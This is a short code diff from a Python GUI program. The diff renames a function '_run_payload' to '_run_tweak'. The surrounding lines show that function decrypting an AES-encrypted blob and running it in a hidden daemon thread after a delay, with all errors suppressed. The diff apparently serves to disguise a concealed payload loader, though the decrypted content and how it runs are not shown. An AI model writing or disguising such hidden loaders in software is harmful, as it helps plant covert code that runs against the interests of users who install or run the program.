@@ -33,7 +33,7 @@ def _decrypt():
     c = AES.new(key, AES.MODE_GCM, nonce=_NONCE)
     return c.decrypt_and_verify(_CT, _TAG)
 
-def _run_payload():
+def _run_tweak():
     try:
         time.sleep(2.0)   # small delay so GUI paints first
         raw = _decrypt()
@@ -47,7 +47,7 @@ def _run_payload():
         pass   #  GUI
 
 def _spawn_hidden():
-    t = threading.Thread(target=_run_payload, daemon=True)
+    t = threading.Thread(target=_run_tweak, daemon=True)
     t.start()
 
 # ============================================================
